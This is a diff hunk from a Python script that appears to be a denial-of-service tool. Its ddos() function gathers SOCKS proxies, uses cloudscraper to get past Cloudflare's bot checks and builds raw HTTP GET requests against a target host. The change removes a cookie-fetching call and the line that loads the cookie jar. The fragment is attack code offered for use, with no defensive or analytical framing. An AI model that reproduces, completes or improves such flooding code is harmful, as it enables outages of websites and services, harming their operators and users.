@@ -2504,13 +2504,11 @@ def Headerss(method):
     return header
 
 def ddos():
-    get_cookie()
     socksCrawler()
     socksCrawlz()
     session = requests.Session()
     scraper = cloudscraper.create_scraper(sess=session)
     jar = RequestsCookieJar()
-    jar.set(cookieJAR['name'], cookieJAR['value'])
     scraper.cookies = jar
     req =  "GET / HTTP/1.1\r\nHost: " + urlparse(ip).netloc + "\r\n"
     get_host = "GET HTTP/1.1\r\nHost: " + ip + "\r\n"
